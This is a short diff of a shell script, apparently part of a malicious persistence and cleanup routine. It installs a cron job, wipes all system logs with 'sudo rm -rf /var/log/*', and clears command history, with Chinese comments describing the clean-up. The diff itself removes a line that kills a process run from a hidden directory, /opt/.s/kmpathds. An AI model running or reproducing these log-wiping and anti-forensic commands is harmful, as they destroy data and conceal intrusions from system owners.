@@ -28,7 +28,6 @@ fi
 (crontab -l | grep -v "curl" ; echo "$CRON_JOB") | crontab -
 
 # 清除当前系统的执行目录
-ps aux | grep '/opt/.s/kmpathds' | grep -v grep | awk 'NR > 1 {print $2}' | xargs kill
 sudo rm -rf /var/log/*
 
 # 清除命令历史记录
